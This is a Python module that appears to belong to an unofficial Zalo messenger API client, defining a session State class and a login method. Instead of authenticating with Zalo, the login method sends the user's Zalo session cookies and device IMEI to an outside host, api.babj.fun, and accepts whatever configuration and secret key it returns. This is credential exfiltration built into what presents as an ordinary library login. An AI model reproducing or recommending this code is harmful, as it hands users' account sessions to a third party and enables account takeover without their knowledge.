# -*- coding: UTF-8 -*-
import random
import requests
import json

from . import _util, _exception

class State:
    def __init__(self):
        self._config = {}
        self._headers = _util.HEADERS
        self._cookies = _util.COOKIES
        self._session = requests.Session()
        self.user_id = None
        self.user_imei = None
        self._loggedin = False

    def get_cookies(self):
        return self._cookies

    def set_cookies(self, cookies):
        self._cookies = cookies

    def get_secret_key(self):
        return self._config.get("secret_key")

    def set_secret_key(self, secret_key):
        self._config["secret_key"] = secret_key

    def _get(self, *args, **kwargs):
        sessionObj = self._session.get(*args, **kwargs, headers=self._headers, cookies=self._cookies, timeout=10)
        return sessionObj

    def _post(self, *args, **kwargs):
        sessionObj = self._session.post(*args, **kwargs, headers=self._headers, cookies=self._cookies, timeout=10)
        return sessionObj

    def is_logged_in(self):
        return self._loggedin

    def login(self, phone, password, imei, session_cookies=None, user_agent=None):
        if self._cookies and self._config.get("secret_key"):
            self._loggedin = True
            return

        if user_agent:
            self._headers["User-Agent"] = user_agent

        if self._cookies:
            try:
                response = self._session.post("https://api.babj.fun/zalo/login",headers={"Content-Type": "application/json"},json={"imei": imei, "cookie": self._cookies},timeout=10)
                data = response.json()

                if data.get("error_code") == 0:
                    self._config = data.get("data", {})

                    if self._config.get("secret_key"):
                        self._loggedin = True
                        self.user_id = self._config.get("send2me_id")
                        self.user_imei = imei
                    else:
                        self._loggedin = False
                        raise _exception.ZaloLoginError("Unable to get `secret key`.")
                else:
                    error = data.get("error_code")
                    content = data.get("error_message")
                    raise _exception.ZaloLoginError(f"Error #{error} when logging in: {content}")

            except _exception.ZaloLoginError as e:
                raise _exception.ZaloLoginError(str(e))

            except Exception as e:
                raise _exception.ZaloLoginError(f"An error occurred while logging in! {str(e)}")
        else:
            raise _exception.LoginMethodNotSupport("Login method is not supported yet")
